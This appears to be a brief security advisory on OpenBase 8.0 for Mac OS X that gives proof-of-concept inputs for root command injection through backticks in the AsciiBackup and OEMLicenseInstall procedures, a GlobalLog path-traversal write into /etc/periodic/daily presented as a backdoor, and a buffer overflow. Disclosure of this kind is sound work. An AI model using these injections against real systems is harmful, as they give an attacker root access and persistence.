OpenBase is prone to a buffer-overflow vulnerability and multiple remote command-execution vulnerabilities.

An attacker could exploit these issues to execute arbitrary code or commands with superuser privileges. Successfully exploiting these issues will facilitate in the complete compromise of affected computers.

1. call AsciiBackup('\`id\`')
results in commands being run as root.

desktop:/tmp kfinisterre$ tail -f /tmp/isql_messages

OpenBase ISQL version 8.0 for MacOS X

Using database 'WOMovies' on host 'localhost'

Could not write file:uid=0(root) gid=0(wheel) groups=0(wheel)/WOMovies.bck

2. call GlobalLog("../../../path/to/file", "\n user input goes here \n")
results in root owned files being created. Combine with above for an
easy backdoor.

openbase 1> call GlobalLog("../../../../../../etc/periodic/daily/600"
, "\n/usr/bin/id > /tmp/file\n")
openbase 2> go

3. select aaaaaaaaaaaaaaaaaaaa... from aaaaaaaaaaaaaaaaaaa...
results in zone_free() issues referencing 0x61616161

4. call OEMLicenseInstall("`/usr/bin/id>/tmp/aaax`","`/usr/bin/id>/tmp/bbbx
`","`/usr/bin/id>/tmp/ddddx`","`/usr/bin/id>/tmp/cdfx`")
results in commands being run as root
